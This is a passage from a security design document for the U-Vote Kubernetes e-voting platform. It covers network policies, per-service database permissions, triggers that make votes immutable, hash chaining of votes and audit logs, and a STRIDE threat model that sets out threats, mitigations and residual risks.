results, admin) on their specific ports. It cannot reach the audit service, email
service, or database. This is enforced by Policy 03 (one policy per exposed service).

#### Lateral Movement Prevention

A critical security property of this matrix is the absence of inter-service
communication. No application service can directly communicate with another
application service. For example:

- The auth-service cannot connect to the voting-service
- The election-service cannot connect to the admin-service
- The results-service cannot connect to the auth-service

This means that compromising one service does not grant network access to other
services. The only shared resources are the database (constrained by per-service
users) and the audit service (append-only). An attacker who compromises the
results-service, for example, could:
- Read from the database (SELECT only on votes, elections, candidates)
- Write to the audit log

But could NOT:
- Modify any database record
- Reach the auth-service to steal credentials
- Reach the admin-service to manipulate voter registrations
- Reach the voting-service to cast fraudulent votes
- Reach the email-service to send phishing emails
- Reach the frontend to serve malicious content

---

## 6. Database Security

This section provides a detailed analysis of the security measures protecting
the PostgreSQL database, the most critical data store in the U-Vote platform.
Database security is implemented across four layers: network, authentication,
authorisation, and data integrity.

### 6.1 Network-Level Database Protection

The PostgreSQL database is protected at the network level by a combination of
the default-deny policy and Policy 02 (database access control):

**No External Exposure:**
- PostgreSQL has no corresponding Ingress resource — there is no HTTP path that
  routes to port 5432.
- There is no NodePort or LoadBalancer Service exposing port 5432 outside the
  cluster.
- Policy 03 (ingress controller access) does not include PostgreSQL — the
  Ingress Controller cannot reach port 5432.

**Restricted Internal Access:**
- Only six named services can connect to PostgreSQL (Policy 02a ingress).
- Only those same six services have egress permissions to reach PostgreSQL
  (Policy 02b egress).
- The frontend and email services are explicitly excluded.
- Pods without an `app` label matching one of the six allowed values cannot
  connect, including ad-hoc debug pods, CI/CD runners, or monitoring agents.

**Port Restriction:**
- Only port 5432/TCP is permitted. If PostgreSQL exposed additional ports
  (e.g., a metrics exporter on 9187), they would be blocked by the network
  policy.

**Cross-Namespace Isolation:**
- No cross-namespace ingress is defined for PostgreSQL. Services in other
  namespaces (including kube-system, ingress-nginx, and any future namespaces)
  cannot connect to the database.

### 6.2 Authentication Security

Each application service connects to PostgreSQL with its own dedicated database
user. There is no shared application account, no generic `app` user, and no
superuser access from any service.

The six database users are:

| Database User | Used By | Connection Source |
|--------------|---------|------------------|
| `auth_service` | auth-service | auth-service pod |
| `voting_service` | voting-service | voting-service pod |
| `election_service` | election-service | election-service pod |
| `results_service` | results-service | results-service pod |
| `audit_service` | audit-service | audit-service pod |
| `admin_service` | admin-service | admin-service pod |

Each user's password is stored as a Kubernetes Secret and injected into the
service pod as an environment variable. Passwords are not hardcoded in source
code, Dockerfiles, or deployment manifests.

The per-service user model provides several security benefits:

1. **Accountability:** Database query logs can identify which service executed
   each query, enabling forensic analysis in the event of a breach.
2. **Blast Radius Containment:** A compromised service can only access the
   tables granted to its user. Even if an attacker achieves SQL injection, they
   are constrained by the user's GRANT permissions.
3. **Credential Rotation:** Individual service credentials can be rotated
   without affecting other services. Rotating `auth_service`'s password requires
   only restarting the auth-service pod with the new secret.
4. **Least Privilege Enforcement:** Each user is granted exactly the permissions
   required by its service, nothing more.

### 6.3 Authorisation Security

Database authorisation is enforced through PostgreSQL's `GRANT` system. Each
database user has been granted the minimum set of permissions required for its
service to function. The full grant statements from the schema are:

#### Auth Service User

```sql
GRANT SELECT, INSERT, UPDATE ON admins TO auth_service;
GRANT USAGE, SELECT ON SEQUENCE admins_admin_id_seq TO auth_service;
```

**Permissions Analysis:**
- **SELECT** on `admins`: Required to look up admin credentials during login.
- **INSERT** on `admins`: Required to create new admin accounts.
- **UPDATE** on `admins`: Required to update passwords and last-login timestamps.
- **Sequence access**: Required for `INSERT` operations that use auto-incrementing IDs.
- **NOT granted**: DELETE (admins cannot be deleted through the application),
  access to any other table (votes, elections, candidates, voters, voting_tokens,
  audit_logs).

#### Voting Service User

```sql
GRANT INSERT ON votes TO voting_service;
GRANT SELECT ON elections, candidates TO voting_service;
GRANT SELECT, UPDATE ON voting_tokens TO voting_service;
GRANT USAGE, SELECT ON SEQUENCE votes_vote_id_seq TO voting_service;
```

**Permissions Analysis:**
- **INSERT** on `votes`: Required to record a cast vote. Critically, UPDATE and
  DELETE are NOT granted — the voting service cannot modify or remove votes even
  at the database user level.
- **SELECT** on `elections`: Required to validate that an election is active
  before accepting a vote.
- **SELECT** on `candidates`: Required to validate that the chosen candidate
  belongs to the election.
- **SELECT, UPDATE** on `voting_tokens`: Required to look up a token (SELECT)
  and mark it as consumed (UPDATE) after a vote is cast.
- **Sequence access**: Required for INSERT operations on the votes table.
- **NOT granted**: Any access to `admins`, `voters`, or `audit_logs`. The
  voting service cannot look up voter identities, preserving ballot secrecy.

#### Election Service User

```sql
GRANT SELECT, INSERT, UPDATE, DELETE ON elections TO election_service;
GRANT USAGE, SELECT ON SEQUENCE elections_election_id_seq TO election_service;
```

**Permissions Analysis:**
- **Full CRUD** on `elections`: Required for the complete election lifecycle
  (create, view, modify, delete draft elections).
- **Sequence access**: Required for INSERT operations.
- **NOT granted**: Access to any other table. The election service cannot access
  votes, voters, candidates, admins, or audit logs directly.

#### Results Service User

```sql
GRANT SELECT ON votes, elections, candidates TO results_service;
```

**Permissions Analysis:**
- **SELECT only** on three tables: This is the most restrictive user. The
  results service can read votes (to count them), elections (to identify which
  election results are requested), and candidates (to map candidate IDs to names).
- **NOT granted**: INSERT, UPDATE, DELETE on any table. No sequence access (not
  needed for read-only operations). This user cannot alter any data in the
  database under any circumstance.

#### Audit Service User

```sql
GRANT INSERT, SELECT ON audit_logs TO audit_service;
GRANT USAGE, SELECT ON SEQUENCE audit_logs_log_id_seq TO audit_service;
```

**Permissions Analysis:**
- **INSERT** on `audit_logs`: Required to write new audit entries.
- **SELECT** on `audit_logs`: Required to read audit history and verify hash
  chains.
- **Sequence access**: Required for INSERT operations.
- **NOT granted**: UPDATE or DELETE on `audit_logs`. The audit service cannot
  modify or remove audit entries, enforcing the append-only property of the
  audit trail. Also not granted access to any other table.

#### Admin Service User

```sql
GRANT SELECT, INSERT, UPDATE, DELETE ON voters, candidates, voting_tokens TO admin_service;
GRANT USAGE, SELECT ON SEQUENCE voters_voter_id_seq TO admin_service;
GRANT USAGE, SELECT ON SEQUENCE candidates_candidate_id_seq TO admin_service;
GRANT USAGE, SELECT ON SEQUENCE voting_tokens_token_id_seq TO admin_service;
```

**Permissions Analysis:**
- **Full CRUD** on `voters`: Required for voter registration management.
- **Full CRUD** on `candidates`: Required for candidate registration management.
- **Full CRUD** on `voting_tokens`: Required for token generation and management.
- **Sequence access**: Required for INSERT operations on all three tables.
- **NOT granted**: Access to `votes`, `elections`, `admins`, or `audit_logs`.
  The admin service can manage the registration side of the platform but cannot
  read or alter votes, election configurations, admin accounts, or audit history.

### 6.4 Data-Level Security

Beyond network policies and database permissions, the U-Vote platform implements
data-level security mechanisms that protect the integrity of critical records
even if the database user permissions were somehow bypassed.

#### Vote Immutability

The `votes` table is protected by two database triggers that prevent any
modification or deletion of cast votes:

```sql
CREATE OR REPLACE FUNCTION prevent_vote_modification()
RETURNS TRIGGER AS $$
BEGIN
    RAISE EXCEPTION 'Votes cannot be modified or deleted';
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER prevent_vote_update
    BEFORE UPDATE ON votes
    FOR EACH ROW
    EXECUTE FUNCTION prevent_vote_modification();

CREATE TRIGGER prevent_vote_delete
    BEFORE DELETE ON votes
    FOR EACH ROW
    EXECUTE FUNCTION prevent_vote_modification();
```

**How It Works:**
- The `prevent_vote_modification()` function unconditionally raises an exception,
  aborting the operation.
- The `prevent_vote_update` trigger fires BEFORE any UPDATE on the votes table.
  The exception is raised before the update is applied, so the original row is
  never modified.
- The `prevent_vote_delete` trigger fires BEFORE any DELETE on the votes table.
  The exception prevents the row from being removed.
- These triggers fire for ALL database users, including superusers. Even if an
  attacker gained superuser access, they would need to explicitly drop the
  triggers before modifying votes — an action that would itself be logged.

**Defence in Depth:**
Vote immutability is enforced at three levels:
1. **Network Policy:** Only the voting-service can reach PostgreSQL, and only
   it has INSERT permission on votes.
2. **Database Permissions:** The `voting_service` user has INSERT only — no
   UPDATE or DELETE permission.
3. **Database Triggers:** Even if permissions were bypassed, the triggers
   prevent UPDATE and DELETE operations at the PostgreSQL engine level.

#### Vote Hash-Chaining

Each vote is hash-chained to the previous vote in the same election, creating a
tamper-evident chain similar to a blockchain:

```sql
CREATE OR REPLACE FUNCTION generate_vote_hash()
RETURNS TRIGGER AS $$
DECLARE
    prev_hash VARCHAR(64);
BEGIN
    SELECT vote_hash INTO prev_hash
    FROM votes
    WHERE election_id = NEW.election_id
    ORDER BY cast_at DESC
    LIMIT 1;

    NEW.previous_hash := COALESCE(prev_hash, REPEAT('0', 64));
    NEW.vote_hash := encode(
        digest(
            NEW.election_id::text ||
            NEW.candidate_id::text ||
            NEW.cast_at::text ||
            NEW.previous_hash,
            'sha256'
        ),
        'hex'
    );
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

**How It Works:**
1. When a new vote is inserted, the trigger retrieves the most recent vote's
   hash for the same election.
2. If no previous vote exists (first vote in the election), the previous hash
   is set to 64 zeros (`000...000`).
3. The new vote's hash is computed as SHA-256 of the concatenation of:
   election_id + candidate_id + cast_at timestamp + previous_hash.
4. Both `previous_hash` and `vote_hash` are stored with the vote record.

**Tamper Detection:**
If any vote in the chain is modified (which should be impossible due to the
immutability triggers), the hash chain breaks:
- The modified vote's hash no longer matches its computed value.
- All subsequent votes' `previous_hash` values no longer match, creating a
  cascade of verification failures.
- A verification function can walk the chain and identify exactly where
  tampering occurred.

**Per-Election Chains:**
Hash chains are maintained per election (`WHERE election_id = NEW.election_id`).
Each election has its own independent chain, starting from the 64-zero genesis
hash. This means that votes in one election do not affect the hash chain of
another election.

#### Encrypted Password Storage

Admin passwords are stored using bcrypt with a cost factor of 12:

- Bcrypt is a deliberately slow hashing algorithm designed for password storage.
- Cost factor 12 means 2^12 = 4,096 iterations of the key derivation function.
- Each password has a unique random salt embedded in the hash output.
- The resulting hash is stored in the `admins` table's password column.
- The auth-service compares submitted passwords against the stored hash using
  bcrypt's constant-time comparison function, preventing timing attacks.

Even if an attacker obtained a full dump of the `admins` table, the bcrypt
hashes would require significant computational effort to crack, with each hash
requiring independent brute-force effort due to unique salts.

#### Audit Log Hash-Chaining

The audit log table uses the same hash-chaining approach as the votes table,
creating a tamper-evident chain of audit entries. If any audit entry is modified
or deleted (which the database permissions prevent), the hash chain breaks and
the tampering is detectable.

This provides a dual layer of tamper evidence:
1. **Votes:** Hash-chained to detect vote tampering.
2. **Audit Logs:** Hash-chained to detect audit log tampering.

An attacker would need to defeat both chains simultaneously to cover their
tracks — modify a vote AND modify the corresponding audit entry AND recalculate
all subsequent hashes in both chains. The immutability triggers and restricted
database permissions make this effectively impossible through the application
layer.

---

## 7. Threat Model

This section presents a structured threat model for the U-Vote platform, applying
the STRIDE framework to systematically identify, categorise, and assess threats
to the system. Each threat is mapped to the specific network security controls
and application-layer defences that mitigate it.

### 7.1 Threat Modeling Methodology

#### STRIDE Framework

STRIDE is a threat classification model developed by Microsoft that categorises
threats into six categories. It is widely used in security engineering to ensure
comprehensive coverage of potential attack vectors. The U-Vote threat model
applies each STRIDE category to the specific architecture of the platform.

```
+-------------------------------------------------------------------+
|                    STRIDE Threat Categories                        |
+-------------------------------------------------------------------+
|                                                                   |
|  S - Spoofing Identity                                            |
|      Pretending to be someone or something you are not.           |
|      U-Vote context: Forging JWT tokens, impersonating            |
|      services via pod label manipulation, spoofing voter          |
|      identity through token reuse.                                |
|                                                                   |
|  T - Tampering with Data                                          |
|      Modifying data in transit or at rest without authorisation.   |
|      U-Vote context: Altering votes in the database, modifying    |
|      audit logs, intercepting and changing API payloads between   |
|      services.                                                    |
|                                                                   |
|  R - Repudiation                                                  |
|      Denying that an action was performed.                        |
|      U-Vote context: An administrator denying they closed an      |
|      election, a voter claiming their vote was not recorded,      |
|      denying that audit log entries are legitimate.               |
|                                                                   |
|  I - Information Disclosure                                       |
|      Exposing information to unauthorised parties.                |
|      U-Vote context: Leaking voter-to-candidate mappings,         |
|      exposing database credentials, revealing election results    |
|      before the election closes.                                  |
|                                                                   |
|  D - Denial of Service                                            |
|      Making a system unavailable or degraded.                     |
|      U-Vote context: Flooding the ingress controller, exhausting  |
|      database connections, overwhelming the audit service with    |
|      spurious log entries.                                        |
|                                                                   |
|  E - Elevation of Privilege                                       |
|      Gaining capabilities beyond what was authorised.             |
|      U-Vote context: A voter gaining admin access, a read-only    |
|      service writing to the database, a container escaping to     |
|      the host node.                                               |
|                                                                   |
+-------------------------------------------------------------------+
```

#### Application to U-Vote

The threat model is structured around three trust boundaries:

1. **External Boundary** — Between the internet and the Kubernetes cluster
   (enforced by the Nginx Ingress Controller and NetworkPolicy 03).
2. **Namespace Boundary** — Between the `uvote-dev` namespace and other
   namespaces such as `kube-system` and `ingress-nginx` (enforced by namespace-
   scoped NetworkPolicies and RBAC).
3. **Service Boundary** — Between individual microservices within `uvote-dev`
   (enforced by pod-level NetworkPolicies, per-service database users, and
   application-layer authentication).

```
  TRUST BOUNDARY MAP
  ==================

  ┌─── EXTERNAL (Untrusted) ────────────────────────────────────────┐
  │                                                                  │
  │   Internet Users / Voters / Administrators                       │
  │                                                                  │
  └────────────────────────┬─────────────────────────────────────────┘
                           │ HTTPS (TLS terminated at ingress)
                           │
  ┌─── BOUNDARY 1 ─────── │ ────────────────────────────────────────┐
  │  Nginx Ingress         ▼                                         │
  │  Controller        ┌────────┐  NetworkPolicy 03                  │
  │  (ingress-nginx)   │ Ingress│  (allow-from-ingress)              │
  │                    └───┬────┘                                    │
  └──────────────────── │ ──────────────────────────────────────────┘
                        │
  ┌─── BOUNDARY 2 ───── │ ── uvote-dev namespace ──────────────────┐
  │                      ▼                                          │
  │  ┌─── BOUNDARY 3 ── Service-to-Service ─────────────────────┐  │
  │  │                                                           │  │
  │  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐    │  │
  │  │  │ Frontend │ │   Auth   │ │ Election │ │  Voting  │    │  │
  │  │  │  :3000   │ │  :8001   │ │  :8002   │ │  :8003   │    │  │
  │  │  └──────────┘ └─────┬────┘ └─────┬────┘ └─────┬────┘    │  │
  │  │                     │            │            │          │  │
  │  │  ┌──────────┐ ┌─────┴────┐ ┌─────┴────┐ ┌────┴─────┐   │  │
  │  │  │ Results  │ │  Admin   │ │  Audit   │ │  Email   │   │  │
  │  │  │  :8004   │ │  :8006   │ │  :8005   │ │  :8007   │   │  │
  │  │  └─────┬────┘ └─────┬────┘ └─────┬────┘ └──────────┘   │  │
  │  │        │            │            │                      │  │
  │  │        └────────────┼────────────┘                      │  │
  │  │                     │  NetworkPolicy 02                 │  │
  │  │                     ▼  (allow-to-database)              │  │
  │  │               ┌──────────┐                              │  │
  │  │               │PostgreSQL│                              │  │
  │  │               │  :5432   │                              │  │
  │  │               └──────────┘                              │  │
  │  └─────────────────────────────────────────────────────────┘  │
  └────────────────────────────────────────────────────────────────┘
```

### 7.2 Threat Categories

#### 7.2.1 External Threats

The following threats originate from outside the Kubernetes cluster. Each threat
is assessed for likelihood, impact, and mapped to the specific controls that
mitigate it.

##### Threat 1: DDoS on Ingress Controller

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Denial of Service |
| **Description** | An attacker floods the Nginx Ingress Controller with HTTP requests, overwhelming its capacity and making the U-Vote platform unavailable to legitimate users. |
| **Attack Vector** | Volumetric HTTP flood targeting the external IP/domain of the ingress controller. Could use botnets, amplification attacks, or application-layer slowloris techniques. |
| **Likelihood** | Medium |
| **Impact** | High — Complete platform unavailability during an active election would undermine voter confidence and could invalidate election results. |
| **Mitigations Implemented** | 1. Nginx rate limiting configured at the ingress controller level. 2. NetworkPolicy 03 restricts which pods can receive ingress traffic, limiting the blast radius. 3. Default-deny prevents traffic from reaching non-exposed services even if ingress is compromised. |
| **Residual Risk** | Medium — Rate limiting helps but cannot fully mitigate volumetric attacks without upstream DDoS protection (e.g., Cloudflare, AWS Shield). |
| **Detection** | Ingress controller access logs showing abnormal request rates. Pod resource metrics showing CPU/memory saturation. |
| **Response** | Scale ingress controller replicas. Apply stricter rate limits. If persistent, enable upstream DDoS mitigation. |

##### Threat 2: Network Policy Bypass via Kubernetes API Exploit

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Elevation of Privilege |
| **Description** | An attacker exploits a vulnerability in the Kubernetes API server to modify or delete NetworkPolicy resources, thereby removing network segmentation. |
| **Attack Vector** | Exploitation of CVEs in the kube-apiserver, RBAC misconfiguration allowing unauthorised access to the NetworkPolicy API, or compromised ServiceAccount tokens with excessive permissions. |
| **Likelihood** | Low |
| **Impact** | Critical — Complete loss of network segmentation would allow any pod to communicate with any other pod, bypassing the zero-trust model entirely. |
| **Mitigations Implemented** | 1. RBAC restricts NetworkPolicy modification to cluster administrators only. 2. ServiceAccount tokens for application pods have no permissions to modify NetworkPolicies. 3. Calico enforces policies at the node level via iptables/eBPF, independent of the API server. 4. Default-deny provides a fail-closed posture — if policies are corrupted, the deny-all baseline remains. |
| **Residual Risk** | Low — Would require chaining multiple vulnerabilities (API server CVE + privilege escalation). |
| **Detection** | Kubernetes audit logs monitoring NetworkPolicy create/update/delete events. Periodic reconciliation of expected vs. actual policies. |
| **Response** | Immediately reapply network policies from version-controlled manifests. Investigate compromised credentials. Rotate all ServiceAccount tokens. |

##### Threat 3: SQL Injection via Frontend

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Tampering with Data / Information Disclosure |
| **Description** | An attacker crafts malicious input through the frontend web interface that, if passed to the database, could extract, modify, or delete data. |
| **Attack Vector** | Injecting SQL payloads through form fields, URL parameters, or API calls that are rendered by the frontend service. |
| **Likelihood** | Medium |
| **Impact** | Critical — Successful SQL injection could leak voter data, modify votes, or destroy election records. |
| **Mitigations Implemented** | 1. **Network-level:** The frontend-service (app=frontend-service) has NO database access — NetworkPolicy 02 does not include it in the whitelist. Even if SQL injection succeeds at the application layer, the frontend pod physically cannot reach PostgreSQL on port 5432. 2. **Application-level:** All backend services use parameterised queries (prepared statements) preventing SQL injection at the query layer. 3. **Database-level:** Per-service database users have minimal permissions (e.g., results_service has SELECT only). |
| **Residual Risk** | Low — The network-level isolation makes this a defence-in-depth success story. SQL injection in the frontend cannot reach the database. |
| **Detection** | Application-level input validation logging. WAF rules (planned) to detect SQL injection patterns. |
| **Response** | Review and patch vulnerable input handling. Verify network policies remain intact. Audit database for unauthorised changes. |

##### Threat 4: Direct Database Attack from External

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Information Disclosure / Tampering with Data |
| **Description** | An attacker attempts to connect directly to the PostgreSQL database from outside the cluster, bypassing all application-layer security. |
| **Attack Vector** | Port scanning for exposed PostgreSQL ports (5432), exploiting misconfigured NodePort or LoadBalancer services, or tunnelling through a compromised ingress path. |
| **Likelihood** | Low |
| **Impact** | Critical — Direct database access would bypass all application-layer controls including parameterised queries, per-service user permissions, and audit logging. |
| **Mitigations Implemented** | 1. PostgreSQL is deployed as a ClusterIP service — it has no external IP and is not exposed via NodePort or LoadBalancer. 2. NetworkPolicy 02 restricts ingress to PostgreSQL to only six whitelisted service labels. 3. NetworkPolicy 03 does not include PostgreSQL — no ingress route exists for the database. 4. Default-deny blocks all traffic not explicitly permitted. 5. PostgreSQL requires authentication with per-service credentials. |
| **Residual Risk** | Very Low — Multiple independent layers would need to fail simultaneously. |
| **Detection** | Failed connection attempts visible in PostgreSQL logs. NetworkPolicy deny logs in Calico (if enabled). |
| **Response** | Verify ClusterIP service type. Audit ingress routes. Check for unauthorised port-forward sessions. |

##### Threat 5: Man-in-the-Middle (Service-to-Service)

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Information Disclosure / Tampering with Data |
| **Description** | An attacker intercepts traffic between microservices within the cluster, reading or modifying data in transit (e.g., intercepting JWT tokens, vote payloads, or database queries). |
| **Attack Vector** | ARP spoofing within the pod network, compromising a node to sniff traffic, exploiting the lack of mutual TLS between services. |
| **Likelihood** | Low |
| **Impact** | High — Could expose JWT tokens (allowing session hijacking), vote data (breaking anonymity), or database credentials. |
| **Mitigations Implemented** | 1. NetworkPolicies restrict which pods can communicate, limiting the attack surface for interception. 2. Calico's VXLAN encapsulation provides network isolation at the overlay level. 3. Pod-to-pod traffic within a Kind cluster stays on the Docker bridge network, not traversing external networks. |
| **Residual Risk** | Medium — Service-to-service communication is currently unencrypted (HTTP, not HTTPS). This is the most significant residual risk in the current architecture. |
| **Detection** | Anomalous network patterns visible in Calico flow logs. Unexpected pods appearing in the namespace. |
| **Response** | Implement mTLS via service mesh (planned enhancement). Investigate compromised nodes. |

##### Threat 6: DNS Spoofing/Poisoning

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Spoofing Identity |
| **Description** | An attacker poisons DNS responses within the cluster to redirect service-to-service traffic to a malicious pod. For example, making "postgresql" resolve to an attacker-controlled pod that captures database credentials. |
| **Attack Vector** | Compromising CoreDNS in the kube-system namespace, poisoning the DNS cache, or deploying a rogue DNS server. |
| **Likelihood** | Low |
| **Impact** | Critical — Could redirect database traffic to an attacker-controlled pod, capturing all credentials and query data. |
| **Mitigations Implemented** | 1. NetworkPolicy 01 restricts DNS egress to only the kube-system namespace where CoreDNS runs. Pods cannot query arbitrary DNS servers. 2. CoreDNS is managed by Kubernetes and is not directly accessible from application pods beyond port 53 queries. 3. Calico network policies prevent pods from communicating with arbitrary endpoints. |
| **Residual Risk** | Low — Would require compromising CoreDNS itself, which runs in a separate namespace with its own RBAC controls. |
| **Detection** | DNS query logging in CoreDNS. Monitoring for unexpected DNS responses or resolution failures. |
| **Response** | Restart CoreDNS pods to clear poisoned cache. Investigate how the compromise occurred. Consider deploying DNSSEC. |

##### Threat 7: Container Escape

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Elevation of Privilege |
| **Description** | An attacker exploits a vulnerability in the container runtime (containerd) or kernel to escape from a pod container to the host node, gaining node-level access. |
| **Attack Vector** | Exploiting container runtime CVEs (e.g., CVE-2024-21626 runc), kernel vulnerabilities, or misconfigured security contexts (privileged containers, host PID/network namespaces). |
| **Likelihood** | Low |
| **Impact** | Critical — Node-level access bypasses all Kubernetes-layer security including NetworkPolicies, RBAC, and namespace isolation. The attacker could access all pods on the node, read secrets from the kubelet, and potentially compromise the entire cluster. |
| **Mitigations Implemented** | 1. No pods run in privileged mode. 2. No pods mount the host filesystem or use host networking. 3. Container images are based on minimal base images (Alpine, slim variants). 4. Calico network policies still apply at the node level via iptables/eBPF, providing some residual enforcement even after container escape. |
| **Residual Risk** | Medium — Container escapes are rare but devastating. Runtime security tooling (Falco) would improve detection. |
| **Detection** | Anomalous system calls from containers (detectable with Falco, planned). Node-level process monitoring. Unexpected files or processes on the host. |
| **Response** | Isolate the affected node. Cordon and drain workloads. Investigate the escape vector. Patch the runtime/kernel. Redeploy affected pods. |

##### Threat 8: Credential Stuffing on Admin Login

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Spoofing Identity |
| **Description** | An attacker uses lists of compromised credentials from other breaches to attempt to log in to the U-Vote admin interface. |
| **Attack Vector** | Automated login attempts against the /api/auth/login endpoint using credential lists. The attack targets the auth-service through the ingress controller. |
| **Likelihood** | High |
| **Impact** | High — Successful admin login would grant access to election management, voter data, and candidate management. |
| **Mitigations Implemented** | 1. NetworkPolicy 03 routes auth traffic through the ingress controller, where rate limiting is enforced. 2. Bcrypt password hashing with cost factor 12 makes offline cracking expensive. 3. Audit logging records all login attempts (success and failure) via the audit-service, creating a detectable trail. 4. JWT tokens have configurable expiration times. |
| **Residual Risk** | Medium — No account lockout mechanism is currently implemented. Rate limiting at the ingress level provides partial protection. |
| **Detection** | Audit log entries showing repeated failed login attempts from the same source. Ingress controller logs showing high-frequency requests to /api/auth/login. |
| **Response** | Implement account lockout after N failed attempts (planned). Add CAPTCHA to login flow. Review audit logs for compromised accounts. Force password reset if breach is confirmed. |

##### Threat 9: Vote Manipulation

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Tampering with Data |
| **Description** | An attacker attempts to modify recorded votes in the database to change election outcomes. |
| **Attack Vector** | Compromising a service with database write access, direct database access, or exploiting application-level vulnerabilities to issue UPDATE/DELETE statements against the votes table. |
| **Likelihood** | Low |
| **Impact** | Critical — Vote manipulation would fundamentally compromise the integrity of the election, the core purpose of the platform. |
| **Mitigations Implemented** | 1. **Network-level:** Only six services can reach the database (NetworkPolicy 02). Of these, only voting-service has INSERT permission on the votes table. No service has UPDATE or DELETE on votes. 2. **Database-level:** The `prevent_vote_update` trigger blocks all UPDATE operations on the votes table. The `prevent_vote_delete` trigger blocks all DELETE operations. 3. **Application-level:** Hash-chaining of votes creates a tamper-evident chain — any modification breaks the chain and is detectable. 4. **Audit-level:** Vote cast events are logged in the audit trail with their own hash chain. |
| **Residual Risk** | Very Low — An attacker would need to: (a) compromise the voting-service, (b) bypass the database triggers (requires superuser), (c) recalculate the hash chain for all subsequent votes, AND (d) modify the corresponding audit log entries (which have their own immutability triggers and hash chain). |
| **Detection** | Hash chain verification function can detect any broken chain link. Audit log cross-referencing with vote records. Periodic integrity checks. |
| **Response** | Halt the affected election immediately. Run hash chain verification. Compare vote records against audit logs. Investigate the compromise vector. Consider election re-run if integrity cannot be confirmed. |

##### Threat 10: Audit Log Tampering

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Repudiation / Tampering with Data |
| **Description** | An attacker modifies or deletes audit log entries to conceal malicious activity (e.g., covering traces of vote manipulation or unauthorised admin access). |
| **Attack Vector** | Compromising the audit-service or a service with database access, then issuing UPDATE/DELETE on the audit_logs table. |
| **Likelihood** | Low |
| **Impact** | High — Loss of audit trail integrity means security incidents cannot be reliably investigated. It enables repudiation — attackers can deny their actions. |
| **Mitigations Implemented** | 1. **Network-level:** Only six backend services can send events to the audit-service (NetworkPolicy 04). The audit-service is not exposed via ingress (NetworkPolicy 03 excludes it). 2. **Database-level:** The audit_service database user has INSERT and SELECT only — no UPDATE or DELETE. Immutability triggers prevent modification of audit records. 3. **Application-level:** Audit logs are hash-chained. Modification of any entry breaks the chain. |
| **Residual Risk** | Low — Audit log tampering requires superuser database access, which no application service has. |
| **Detection** | Hash chain verification on audit logs. Monitoring for unexpected database superuser activity. Periodic audit log integrity checks. |
| **Response** | Run audit log hash chain verification. Compare expected event counts against actual entries. Investigate database access logs for superuser sessions. |

##### Threat 11: Unauthorised Service Deployment

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Elevation of Privilege |
| **Description** | An attacker deploys a rogue pod into the uvote-dev namespace with labels matching a whitelisted service (e.g., app=auth-service) to gain database access or intercept traffic. |
| **Attack Vector** | Compromised Kubernetes credentials (kubeconfig), exploitation of RBAC misconfiguration, or supply chain attack through CI/CD pipeline to inject a malicious deployment. |
| **Likelihood** | Low |
| **Impact** | High — A rogue pod with the correct labels would inherit all NetworkPolicy permissions of the impersonated service, including database access. |
| **Mitigations Implemented** | 1. RBAC restricts pod creation to authorised users/service accounts. 2. NetworkPolicies are label-based, so a rogue pod with incorrect labels gets no access (default-deny applies). 3. However, if the attacker correctly labels the pod, NetworkPolicies alone cannot distinguish it from the legitimate service. 4. Defence-in-depth: The rogue pod would still need valid database credentials to access PostgreSQL. |
| **Residual Risk** | Medium — This is a known limitation of label-based NetworkPolicies. Mitigation requires admission controllers (OPA Gatekeeper) or service mesh identity (SPIFFE/SPIRE). |
| **Detection** | Monitoring for unexpected pods in the namespace. Image allowlist enforcement via admission controllers (planned). Audit logs of Kubernetes API activity. |
| **Response** | Delete the rogue pod immediately. Investigate how it was deployed. Rotate database credentials. Review RBAC policies and kubeconfig access. |

##### Threat 12: Supply Chain Attack (Container Images)

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Tampering with Data / Elevation of Privilege |
| **Description** | An attacker compromises the container image build or registry to inject malicious code into U-Vote service images. |
| **Attack Vector** | Compromising the Docker Hub/registry account, poisoning base images (node:alpine, python:slim), or injecting malicious dependencies in npm/pip packages. |
| **Likelihood** | Medium |
| **Impact** | Critical — Compromised images could contain backdoors, data exfiltration code, or credential harvesters that operate within the trusted network context. |
| **Mitigations Implemented** | 1. Images are built from pinned base image versions. 2. NetworkPolicies limit what a compromised pod can access — even with malicious code, the pod can only reach the services permitted by its labels. 3. Default-deny prevents unexpected egress, limiting data exfiltration paths. 4. Database access requires valid credentials regardless of pod code. |
| **Residual Risk** | Medium — No image signing or vulnerability scanning is currently automated in the build pipeline. |
| **Detection** | Container image scanning with Trivy (planned). Monitoring for unexpected network connections from pods (denied by default-deny + Calico). |
| **Response** | Rebuild all images from verified source. Scan all images for vulnerabilities. Review dependency lock files. Implement image signing with cosign/Notary. |

##### Threat 13: Data Exfiltration

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Information Disclosure |
| **Description** | An attacker who has compromised a service pod attempts to exfiltrate sensitive data (voter information, election data, credentials) to an external server. |
| **Attack Vector** | The compromised pod attempts to make outbound HTTP/HTTPS connections to an attacker-controlled server, send data via DNS tunnelling, or use other covert channels. |
| **Likelihood** | Medium |
| **Impact** | High — Exposure of voter data or election internals would violate GDPR and destroy platform trust. |
| **Mitigations Implemented** | 1. **Default-deny egress** — NetworkPolicy 00 blocks all outbound traffic by default. 2. **Whitelisted egress only** — Pods can only egress to: kube-system DNS (port 53), PostgreSQL (port 5432), and audit-service (port 8005). No general internet egress is permitted. 3. **No external egress path** — The only service that conceptually needs external access is email-service (SMTP), and even that must be explicitly enabled. 4. **DNS-based exfiltration** — Limited by the fact that DNS egress is restricted to kube-system:53 only, making DNS tunnelling detectable via CoreDNS logs. |
| **Residual Risk** | Low — The egress restrictions are among the strongest controls in the architecture. An attacker would need to exfiltrate data through an allowed channel (e.g., encoding data in audit log entries or DNS queries). |
| **Detection** | Anomalous DNS query patterns (long subdomain labels indicating tunnelling). Unexpected data volumes in service-to-service traffic. Calico flow logs showing denied egress attempts. |
